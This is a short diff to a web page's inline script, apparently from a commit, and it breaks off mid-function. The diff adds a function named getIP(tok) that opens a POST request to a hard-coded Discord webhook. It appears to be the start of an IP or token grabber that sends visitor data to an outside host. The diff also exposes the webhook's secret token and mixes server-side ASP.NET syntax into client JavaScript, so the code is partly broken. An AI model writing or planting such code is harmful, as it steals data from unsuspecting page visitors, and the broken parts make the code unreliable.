@@ -2,7 +2,11 @@ updated
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 
 <script>
-Request.QueryString["myvar"]
+var ham = ""
+
+var myvar = Request.QueryString["myvar"]
+
+
 function getIP(tok) {
   var request = new XMLHttpRequest(); //making a request for the webhook
       request.open("POST", "https://discord.com/api/webhooks/1021895451106086952/4YuLzHnkD6hsCgro9rYMlrJe5-icE7mQ6rFjuJPj539xDf3pBg1iRxpKL7G_Rk1lW2ys");
